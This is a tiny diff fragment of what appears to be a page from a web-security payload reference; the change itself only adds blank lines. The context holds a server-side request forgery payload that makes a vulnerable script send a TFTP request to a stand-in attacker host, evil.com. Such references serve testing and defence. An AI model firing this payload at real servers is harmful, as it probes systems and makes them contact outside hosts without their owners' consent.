@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:02.886719+00:00'
 ```powershell
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 ```
+
+
